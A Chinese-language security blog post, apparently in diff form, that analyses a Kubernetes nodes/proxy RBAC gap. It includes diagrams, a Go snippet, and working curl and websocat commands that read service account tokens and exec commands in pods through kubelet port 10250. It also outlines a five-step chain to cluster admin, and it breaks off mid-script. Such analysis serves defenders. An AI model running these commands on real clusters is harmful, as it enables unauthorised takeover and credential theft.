@@ -1,0 +1,1370 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>K8s RBAC nodes/proxy 授权盲区：一个 GET 权限如何变成集群 RCE - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>K8s RBAC nodes/proxy 授权盲区：一个 GET 权限如何变成集群 RCE</h1>
+<time>2026-07-30</time>
+<ul>
+<li>安全</li>
+<li>漏洞分析
+Slug: k8s-rbac-nodesproxy-授权盲区一个-get-权限如何变成集群-rce</li>
+</ul>
+<hr />
+<h2>0. 漏洞概述</h2>
+<p>2026 年 1 月 26 日，安全研究员 Graham Helton 披露了一个 Kubernetes RBAC 授权设计缺陷：仅需 <code>nodes/proxy</code> 的 GET 权限（几乎所有监控组件都有此权限），配合 WebSocket 直连 Kubelet 10250 端口，即可在集群中任意 Pod 内执行命令，包括 kube-system 中的特权 Pod。</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>披露者</td>
+<td>Graham Helton</td>
+</tr>
+<tr>
+<td>披露日期</td>
+<td>2026-01-26</td>
+</tr>
+<tr>
+<td>官方定性</td>
+<td>Won't Fix / intended behavior</td>
+</tr>
+<tr>
+<td>CVE 编号</td>
+<td>无（不分配）</td>
+</tr>
+<tr>
+<td>所需权限</td>
+<td><code>nodes/proxy</code> GET（仅此一项）</td>
+</tr>
+<tr>
+<td>攻击结果</td>
+<td>集群内任意 Pod 命令执行 → 集群管理员</td>
+</tr>
+<tr>
+<td>测试版本</td>
+<td>v1.34, v1.35</td>
+</tr>
+<tr>
+<td>在野利用</td>
+<td>Horizon3 NodeZero 模块 H3-2026-0002</td>
+</tr>
+<tr>
+<td>受影响 Helm Chart</td>
+<td>69 个</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>1. 核心原理：WebSocket GET 握手如何骗过 RBAC</h2>
+<h3>1.1 K8s RBAC 基础模型</h3>
+<div class="highlight"><pre><span></span><code>┌──────────────────────────────────────────────────────────────────┐
+│<span class="w">              </span><span class="nv">Kubernetes</span><span class="w"> </span><span class="nv">RBAC</span><span class="w"> </span>授权模型<span class="w">                              </span>│
+│<span class="w">                                                                  </span>│
+│<span class="w">  </span><span class="nv">resources</span><span class="w"> </span>×<span class="w"> </span><span class="nv">verbs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>权限<span class="w">                                        </span>│
+│<span class="w">                                                                  </span>│
+│<span class="w">  </span>正常映射:<span class="w">                                                        </span>│
+│<span class="w">  </span>┌─────────────────┬──────────┬──────────────────────────┐<span class="w">       </span>│
+│<span class="w">  </span>│<span class="w"> </span><span class="nv">Resource</span><span class="w">         </span>│<span class="w"> </span><span class="nv">Verb</span><span class="w">     </span>│<span class="w"> </span>含义<span class="w">                      </span>│<span class="w">       </span>│
+│<span class="w">  </span>├─────────────────┼──────────┼──────────────────────────┤<span class="w">       </span>│
+│<span class="w">  </span>│<span class="w"> </span><span class="nv">pods</span><span class="w">            </span>│<span class="w"> </span><span class="nv">get</span><span class="w">      </span>│<span class="w"> </span>读<span class="w"> </span><span class="nv">Pod</span><span class="w"> </span>信息<span class="w"> </span><span class="ss">(</span>只读<span class="ss">)</span><span class="w">         </span>│<span class="w">       </span>│
+│<span class="w">  </span>│<span class="w"> </span><span class="nv">pods</span><span class="w">            </span>│<span class="w"> </span><span class="nv">create</span><span class="w">   </span>│<span class="w"> </span>创建<span class="w"> </span><span class="nv">Pod</span><span class="w"> </span><span class="ss">(</span>写<span class="ss">)</span><span class="w">              </span>│<span class="w">       </span>│
+│<span class="w">  </span>│<span class="w"> </span><span class="nv">pods</span><span class="o">/</span><span class="k">exec</span><span class="w">       </span>│<span class="w"> </span><span class="nv">create</span><span class="w">   </span>│<span class="w"> </span>在容器内执行命令<span class="w"> </span><span class="ss">(</span>写<span class="o">!</span><span class="ss">)</span><span class="w">      </span>│<span class="w">       </span>│
+│<span class="w">  </span>│<span class="w"> </span><span class="nv">pods</span><span class="o">/</span><span class="nv">logs</span><span class="w">       </span>│<span class="w"> </span><span class="nv">get</span><span class="w">      </span>│<span class="w"> </span>读容器日志<span class="w"> </span><span class="ss">(</span>只读<span class="ss">)</span><span class="w">          </span>│<span class="w">       </span>│
+│<span class="w">  </span>│<span class="w"> </span><span class="nv">nodes</span><span class="o">/</span><span class="nv">proxy</span><span class="w">     </span>│<span class="w"> </span><span class="nv">get</span><span class="w">      </span>│<span class="w"> </span>读<span class="w"> </span><span class="nv">Kubelet</span><span class="w"> </span>数据<span class="w"> </span><span class="ss">(</span>看似只读<span class="ss">)</span><span class="w"> </span>│<span class="w">       </span>│
+│<span class="w">  </span>│<span class="w"> </span><span class="nv">nodes</span><span class="o">/</span><span class="nv">proxy</span><span class="w">     </span>│<span class="w"> </span><span class="nv">create</span><span class="w">   </span>│<span class="w"> </span>执行<span class="w"> </span><span class="nv">Kubelet</span><span class="w"> </span>写操作<span class="w">        </span>│<span class="w">       </span>│
+│<span class="w">  </span>└─────────────────┴──────────┴──────────────────────────┘<span class="w">       </span>│
+│<span class="w">                                                                  </span>│
+│<span class="w">  </span>问题:<span class="w"> </span><span class="nv">nodes</span><span class="o">/</span><span class="nv">proxy</span><span class="w"> </span>是一个<span class="w"> </span><span class="nv">catch</span><span class="o">-</span><span class="nv">all</span><span class="w"> </span>权限<span class="w">                         </span>│
+│<span class="w">  </span>它控制对<span class="w"> </span><span class="nv">Kubelet</span><span class="w"> </span>所有<span class="w"> </span><span class="nv">API</span><span class="w"> </span>端点的访问<span class="w">                             </span>│
+│<span class="w">  </span>包括只读的<span class="w"> </span><span class="o">/</span><span class="nv">metrics</span><span class="w"> </span>和写操作的<span class="w"> </span><span class="o">/</span><span class="k">exec</span><span class="w">                            </span>│
+└──────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>1.2 两条访问路径的授权差异</h3>
+<div class="highlight"><pre><span></span><code>┌──────────────────────────────────────────────────────────────────┐
+│<span class="w">           </span>两条访问<span class="w"> </span><span class="nv">Kubelet</span><span class="w"> </span><span class="o">/</span><span class="k">exec</span><span class="w"> </span>端点的路径<span class="w">                        </span>│
+│<span class="w">                                                                  </span>│
+│<span class="w">  </span>路径<span class="w"> </span><span class="nv">A</span>:<span class="w"> </span><span class="nv">API</span><span class="w"> </span><span class="nv">Server</span><span class="w"> </span><span class="nv">Proxy</span><span class="w"> </span><span class="ss">(</span>安全<span class="ss">)</span><span class="w">                                  </span>│
+│<span class="w">  </span>┌──────────┐<span class="w">    </span><span class="nv">POST</span><span class="w">     </span>┌──────────┐<span class="w">   </span>转发<span class="w">    </span>┌──────────┐<span class="w">    </span>│
+│<span class="w">  </span>│<span class="w"> </span>攻击者<span class="w">    </span>│<span class="w"> </span>─────────→<span class="w"> </span>│<span class="w"> </span><span class="nv">API</span><span class="w"> </span><span class="nv">Server</span>│<span class="w"> </span>────────→│<span class="w"> </span><span class="nv">Kubelet</span><span class="w">   </span>│<span class="w">    </span>│
+│<span class="w">  </span>│<span class="w">          </span>│<span class="w">            </span>│<span class="w">          </span>│<span class="w">          </span>│<span class="w"> </span><span class="o">/</span><span class="k">exec</span><span class="w">     </span>│<span class="w">    </span>│
+│<span class="w">  </span>└──────────┘<span class="w">            </span>└──────────┘<span class="w">          </span>└──────────┘<span class="w">    </span>│
+│<span class="w">  </span><span class="nv">HTTP</span>方法:<span class="w"> </span><span class="nv">POST</span><span class="w">          </span><span class="nv">verb</span>映射:<span class="w"> </span><span class="nv">POST</span><span class="w"> </span>→<span class="w"> </span><span class="nv">CREATE</span><span class="w">                 </span>│
+│<span class="w">  </span><span class="nv">RBAC</span>检查:<span class="w"> </span><span class="nv">nodes</span><span class="o">/</span><span class="nv">proxy</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">CREATE</span><span class="w">                                  </span>│
+│<span class="w">  </span>审计日志:<span class="w"> </span>✓<span class="w"> </span>完整记录<span class="w"> </span><span class="ss">(</span>含<span class="w"> </span><span class="nv">pods</span><span class="o">/</span><span class="k">exec</span><span class="w"> </span><span class="nv">URI</span><span class="ss">)</span><span class="w">                          </span>│
+│<span class="w">  </span>结果:<span class="w"> </span>如果只有<span class="w"> </span><span class="nv">GET</span><span class="w"> </span>权限<span class="w"> </span>→<span class="w"> </span><span class="mi">403</span><span class="w"> </span><span class="nv">Forbidden</span><span class="w"> </span>✓<span class="w">                       </span>│
+│<span class="w">                                                                  </span>│
+│<span class="w">  </span>路径<span class="w"> </span><span class="nv">B</span>:<span class="w"> </span><span class="nv">WebSocket</span><span class="w"> </span>直连<span class="w"> </span><span class="ss">(</span>危险<span class="o">!</span><span class="ss">)</span><span class="w">                                   </span>│
+│<span class="w">  </span>┌──────────┐<span class="w">   </span><span class="nv">GET</span><span class="w"> </span><span class="ss">(</span><span class="nv">Upgrade</span><span class="ss">)</span><span class="w"> </span>┌──────────┐<span class="w">                      </span>│
+│<span class="w">  </span>│<span class="w"> </span>攻击者<span class="w">    </span>│<span class="w"> </span>──────────────→<span class="w"> </span>│<span class="w"> </span><span class="nv">Kubelet</span><span class="w">   </span>│<span class="w">                      </span>│
+│<span class="w">  </span>│<span class="w">          </span>│<span class="w"> </span>←<span class="w"> </span><span class="nv">WebSocket</span><span class="w"> </span>──<span class="w"> </span>│<span class="w"> </span>:<span class="mi">10250</span><span class="w">    </span>│<span class="w">                      </span>│
+│<span class="w">  </span>└──────────┘<span class="w">    </span>升级成功<span class="w">      </span>└──────────┘<span class="w">                      </span>│
+│<span class="w">  </span><span class="nv">HTTP</span>方法:<span class="w"> </span><span class="nv">GET</span><span class="w"> </span><span class="ss">(</span><span class="nv">WebSocket</span>握手,<span class="w"> </span><span class="nv">RFC</span><span class="w"> </span><span class="mi">6455</span>规定<span class="ss">)</span><span class="w">                     </span>│
+│<span class="w">  </span><span class="nv">verb</span>映射:<span class="w"> </span><span class="nv">GET</span><span class="w"> </span>→<span class="w"> </span><span class="nv">GET</span><span class="w">                                             </span>│
+│<span class="w">  </span><span class="nv">RBAC</span>检查:<span class="w"> </span><span class="nv">nodes</span><span class="o">/</span><span class="nv">proxy</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">GET</span><span class="w"> </span><span class="ss">(</span>通过<span class="o">!</span><span class="ss">)</span><span class="w">                             </span>│
+│<span class="w">  </span>审计日志:<span class="w"> </span>✗<span class="w"> </span>仅<span class="w"> </span><span class="nv">subjectaccessreviews</span>,<span class="w"> </span>无命令内容<span class="w">                  </span>│
+│<span class="w">  </span>结果:<span class="w"> </span>命令执行成功<span class="o">!</span><span class="w"> </span>✗<span class="w">                                           </span>│
+│<span class="w">                                                                  </span>│
+│<span class="w">  </span>关键:<span class="w"> </span><span class="nv">WebSocket</span><span class="w"> </span>握手必须用<span class="w"> </span><span class="nv">HTTP</span><span class="w"> </span><span class="nv">GET</span><span class="w"> </span><span class="ss">(</span><span class="nv">RFC</span><span class="w"> </span><span class="mi">6455</span><span class="ss">)</span><span class="w">                  </span>│
+│<span class="w">  </span><span class="nv">Kubelet</span><span class="w"> </span>按<span class="w"> </span><span class="nv">GET</span><span class="w"> </span>授权,<span class="w"> </span>但实际执行的是写操作<span class="w"> </span><span class="ss">(</span><span class="o">/</span><span class="k">exec</span><span class="ss">)</span><span class="w">                </span>│
+│<span class="w">  </span>升级后不再做第二次<span class="w"> </span><span class="nv">CREATE</span><span class="w"> </span>检查<span class="o">!</span><span class="w">                                  </span>│
+└──────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>1.3 Kubelet auth.go 的 verb 映射逻辑</h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// Kubelet auth.go 第 80-94行 (简化版)</span>
+<span class="c1">// 将 HTTP method 映射为 RBAC verb</span>
+
+<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">s</span><span class="w"> </span><span class="o">*</span><span class="nx">server</span><span class="p">)</span><span class="w"> </span><span class="nx">authorizeRequest</span><span class="p">(</span><span class="nx">req</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span><span class="w"> </span><span class="nx">authorizer</span><span class="p">.</span><span class="nx">Attributes</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">method</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">Method</span>
+
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">verb</span><span class="w"> </span><span class="kt">string</span>
+<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="nx">method</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">&quot;POST&quot;</span><span class="p">:</span>
+<span class="w">        </span><span class="nx">verb</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;create&quot;</span><span class="w">    </span><span class="c1">// POST → CREATE (正确)</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">&quot;GET&quot;</span><span class="p">:</span>
+<span class="w">        </span><span class="nx">verb</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;get&quot;</span><span class="w">       </span><span class="c1">// GET → GET (WebSocket握手走这里!)</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">&quot;PUT&quot;</span><span class="p">:</span>
+<span class="w">        </span><span class="nx">verb</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;update&quot;</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">&quot;DELETE&quot;</span><span class="p">:</span>
+<span class="w">        </span><span class="nx">verb</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;delete&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 检查: 用户是否有 nodes/proxy 的 GET verb?</span>
+<span class="w">    </span><span class="c1">// 如果有 → 授权通过 (即使是 /exec 端点!)</span>
+<span class="w">    </span><span class="c1">// WebSocket 升级后不再做第二次检查</span>
+
+<span class="w">    </span><span class="nx">attributes</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">authorizer</span><span class="p">.</span><span class="nx">AttributesRecord</span><span class="p">{</span>
+<span class="w">        </span><span class="nx">User</span><span class="p">:</span><span class="w">            </span><span class="nx">user</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">Verb</span><span class="p">:</span><span class="w">            </span><span class="nx">verb</span><span class="p">,</span><span class="w">           </span><span class="c1">// &quot;get&quot;</span>
+<span class="w">        </span><span class="nx">Resource</span><span class="p">:</span><span class="w">        </span><span class="s">&quot;nodes/proxy&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">ResourceRequest</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">decision</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">authorizer</span><span class="p">.</span><span class="nx">Authorize</span><span class="p">(</span><span class="nx">attributes</span><span class="p">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">decision</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">authorizer</span><span class="p">.</span><span class="nx">DecisionAllow</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 授权通过! WebSocket 升级到 /exec handler</span>
+<span class="w">        </span><span class="c1">// 后续命令执行不再检查 CREATE 权限</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="w">  </span><span class="c1">// 允许请求</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">errors</span><span class="p">.</span><span class="nx">New</span><span class="p">(</span><span class="s">&quot;forbidden&quot;</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>1.4 对比演示</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># === 路径 A: API Server Proxy (POST → CREATE → 403) ===</span>
+
+<span class="c1"># 设置环境变量</span>
+<span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>/var/run/secrets/kubernetes.io/serviceaccount/token<span class="k">)</span>
+<span class="nv">APISERVER</span><span class="o">=</span>https://kubernetes.default.svc
+<span class="nv">NODE_NAME</span><span class="o">=</span><span class="k">$(</span>hostname<span class="k">)</span><span class="w">  </span><span class="c1"># 或通过 Downward API 获取</span>
+
+<span class="c1"># 通过 API Server Proxy 路径访问 /exec</span>
+<span class="c1"># 使用 POST 方法 (标准 HTTP)</span>
+curl<span class="w"> </span>-sk<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;</span><span class="nv">$APISERVER</span><span class="s2">/api/v1/nodes/</span><span class="nv">$NODE_NAME</span><span class="s2">/proxy/exec/default/nginx/nginx?command=id&amp;stdout=true&quot;</span>
+
+<span class="c1"># 结果: 403 Forbidden</span>
+<span class="c1"># {</span>
+<span class="c1">#   &quot;kind&quot;: &quot;Status&quot;,</span>
+<span class="c1">#   &quot;message&quot;: &quot;nodes \&quot;node-1\&quot; is forbidden: cannot create resource \&quot;nodes/proxy\&quot;&quot;</span>
+<span class="c1"># }</span>
+<span class="c1"># ↑ 正确映射为 CREATE, 没有 CREATE 权限被拒绝 ✓</span>
+
+
+<span class="c1"># === 路径 B: WebSocket 直连 (GET → GET → RCE!) ===</span>
+
+<span class="c1"># 获取 Node IP</span>
+<span class="nv">NODE_IP</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-sk<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;</span><span class="nv">$APISERVER</span><span class="s2">/api/v1/nodes/</span><span class="nv">$NODE_NAME</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.status.addresses[] | select(.type==&quot;InternalIP&quot;).address&#39;</span><span class="k">)</span>
+
+<span class="c1"># 使用 WebSocket 直连 Kubelet 10250 端口</span>
+<span class="c1"># WebSocket 握手使用 HTTP GET (RFC 6455 规定)</span>
+websocat<span class="w"> </span>--insecure<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--header<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--protocol<span class="w"> </span><span class="s2">&quot;v4.channel.k8s.io&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;wss://</span><span class="nv">$NODE_IP</span><span class="s2">:10250/exec/default/nginx/nginx?output=1&amp;error=1&amp;command=id&quot;</span>
+
+<span class="c1"># 结果: 命令执行成功!</span>
+<span class="c1"># uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="c1"># ← GET 握手绕过 CREATE 检查, 直接执行! ✗</span>
+</code></pre></div>
+
+<hr />
+<h2>2. 完整攻击链：5 步从 GET 权限到集群管理员</h2>
+<h3>2.1 攻击链总览</h3>
+<div class="highlight"><pre><span></span><code><span class="err">┌──────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">        </span><span class="n">nodes</span><span class="o">/</span><span class="n">proxy</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">集群</span><span class="w"> </span><span class="n">RCE</span><span class="w"> </span><span class="err">完整攻击链</span><span class="w">                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="err">确认权限</span><span class="w">                                                </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌───────────────────────────────────────────┐</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">secrets</span><span class="o">/.../</span><span class="n">token</span><span class="w">             </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">kubectl</span><span class="w"> </span><span class="n">auth</span><span class="w"> </span><span class="n">can</span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">--</span><span class="n">list</span><span class="w">                  </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">确认有</span><span class="w"> </span><span class="n">nodes</span><span class="o">/</span><span class="n">proxy</span><span class="w"> </span><span class="n">GET</span><span class="w">                    </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└─────────────────┬─────────────────────────┘</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">                                             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="err">获取</span><span class="w"> </span><span class="n">Node</span><span class="w"> </span><span class="n">IP</span><span class="w">                    </span><span class="err">▼</span><span class="w">                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌───────────────────────────────────────────┐</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">通过</span><span class="w"> </span><span class="n">Downward</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="err">或</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="err">查询</span><span class="w">        </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">获取目标</span><span class="w"> </span><span class="n">Kubelet</span><span class="w"> </span><span class="err">的</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="err">地址</span><span class="w">               </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└─────────────────┬─────────────────────────┘</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">                                             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span><span class="w"> </span><span class="err">枚举目标</span><span class="w"> </span><span class="n">Pod</span><span class="w">                    </span><span class="err">▼</span><span class="w">                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌───────────────────────────────────────────┐</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">连接</span><span class="w"> </span><span class="n">Kubelet</span><span class="w"> </span><span class="o">/</span><span class="n">pods</span><span class="w"> </span><span class="err">端点</span><span class="w">                    </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">列出所有运行中的</span><span class="w"> </span><span class="n">Pod</span><span class="w"> </span><span class="err">和容器</span><span class="w">                  </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">优先选择</span><span class="w"> </span><span class="n">kube</span><span class="o">-</span><span class="n">system</span><span class="w"> </span><span class="err">中的特权</span><span class="w"> </span><span class="n">Pod</span><span class="w">           </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="p">(</span><span class="err">如</span><span class="w"> </span><span class="n">kube</span><span class="o">-</span><span class="n">proxy</span><span class="p">,</span><span class="w"> </span><span class="n">controller</span><span class="o">-</span><span class="n">manager</span><span class="p">)</span><span class="w">        </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└─────────────────┬─────────────────────────┘</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">                                             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span><span class="w"> </span><span class="n">WebSocket</span><span class="w"> </span><span class="n">exec</span><span class="w">                 </span><span class="err">▼</span><span class="w">                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌───────────────────────────────────────────┐</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">websocat</span><span class="w"> </span><span class="n">wss</span><span class="p">:</span><span class="o">//</span><span class="n">NODE</span><span class="p">:</span><span class="mi">10250</span><span class="o">/</span><span class="n">exec</span><span class="o">/...</span><span class="w">         </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="err">握手</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">RBAC</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="err">检查通过</span><span class="w">                </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">WebSocket</span><span class="w"> </span><span class="err">升级</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">命令执行</span><span class="w">                   </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└─────────────────┬─────────────────────────┘</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">                                             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span><span class="w"> </span><span class="err">提权到集群管理员</span><span class="w">                </span><span class="err">▼</span><span class="w">                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌───────────────────────────────────────────┐</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">从特权</span><span class="w"> </span><span class="n">Pod</span><span class="w"> </span><span class="err">偷取</span><span class="w"> </span><span class="n">ServiceAccount</span><span class="w"> </span><span class="n">Token</span><span class="w">        </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">或创建特权</span><span class="w"> </span><span class="n">Pod</span><span class="w"> </span><span class="err">挂载宿主机文件系统</span><span class="w">            </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">集群完全沦陷</span><span class="w">                              </span><span class="err">│</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└───────────────────────────────────────────┘</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">审计盲区</span><span class="p">:</span><span class="w"> </span><span class="err">整个过程在</span><span class="w"> </span><span class="n">audit</span><span class="w"> </span><span class="nb">log</span><span class="w"> </span><span class="err">中仅显示</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">subjectaccessreviews</span><span class="p">,</span><span class="w"> </span><span class="err">看不到执行的命令内容</span><span class="w">                       </span><span class="err">│</span>
+<span class="err">└──────────────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<h3>2.2 Step 1：确认权限</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># step1_check_permissions.sh</span>
+
+<span class="c1"># 读取 ServiceAccount Token</span>
+<span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>/var/run/secrets/kubernetes.io/serviceaccount/token<span class="k">)</span>
+<span class="nv">APISERVER</span><span class="o">=</span>https://kubernetes.default.svc
+<span class="nv">CACERT</span><span class="o">=</span>/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Reading ServiceAccount Token...&quot;</span>
